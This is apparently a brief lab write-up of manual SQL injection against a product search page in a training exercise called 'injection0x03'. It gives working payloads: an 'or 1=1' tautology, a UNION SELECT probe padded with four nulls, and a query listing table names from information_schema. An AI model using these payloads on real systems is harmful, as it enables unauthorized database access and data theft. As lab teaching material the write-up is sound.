We have 2 ways to do this :D

Manually using the **UNION SELECT** query or using `sqlmap`

***

We are giving a product page with the search functionality

Using this query in the search bar - `senpai' or 1=1#` we got back all the lists of product

we can then advance our query by using **UNION SELECT**, like we said in the past modules, keep adding `null` till something clicks, this time we needed 4 nulls

```
senpai' union select null,null,null,null#
```

We can then attempt to get all tables from this database by using the query as shown below

```
senpai' union select null,null,null,table_name from information_schema.tables#
```

Searching for **injection0x03** gives us a `_users` and `_products` table
